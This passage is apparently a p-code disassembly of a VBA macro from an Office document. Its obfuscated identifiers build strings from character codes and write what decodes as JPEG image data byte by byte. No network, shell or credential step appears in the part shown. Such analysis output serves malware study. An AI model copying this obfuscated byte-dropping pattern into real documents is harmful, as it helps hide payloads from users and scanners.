' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00E0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0046 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0046 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00DB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0013 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0015 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0015 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #50:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #51:
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0016 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0026 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0026 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003C 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0040 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0058 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0058 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0060 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #52:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #53:
' 	LitDI2 0x007C 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x009E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0086 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0096 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0060 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00BB 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0096 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A9 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B3 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0084 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C2 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AC 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00CE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x009E 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AE 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #54:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #55:
' 	LitDI2 0x00DB 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001F 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0060 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #56:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #57:
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #58:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #59:
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00AA 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #60:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #61:
' 	LitDI2 0x001F 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0006 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0007 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0009 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #62:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #63:
' 	LitDI2 0x00FF 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x00C4 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B5 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0010 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0002 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0003 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0004 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0011 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0005 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0012 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0021 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #64:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #65:
' 	LitDI2 0x0031 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0041 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0006 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0013 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0051 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0007 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0071 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0014 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0032 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0081 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0091 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00A1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0023 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0042 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00B1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00C1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0015 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0052 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00D1 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x00F0 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0024 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0033 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0082 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0009 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #66:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #67:
' 	LitDI2 0x0016 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0017 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0018 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0019 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x001A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0025 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0026 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0027 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x002A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0034 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0035 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0036 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0037 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0038 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0039 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0044 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0046 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0047 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0048 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0049 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x004A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0053 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0055 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #68:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #69:
' 	LitDI2 0x0057 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0058 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0059 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x005A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0067 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0068 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x006A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0076 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0083 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0084 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0085 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0086 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0087 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0088 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0089 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x008A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0092 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0093 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St Like 
' Line #70:
' 	Ld Like 
' 	Paren 
' 	Ld a 
' 	ArgsMemCall Xor 0x0001 
' Line #71:
' 	LitDI2 0x0094 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0095 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x0096 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
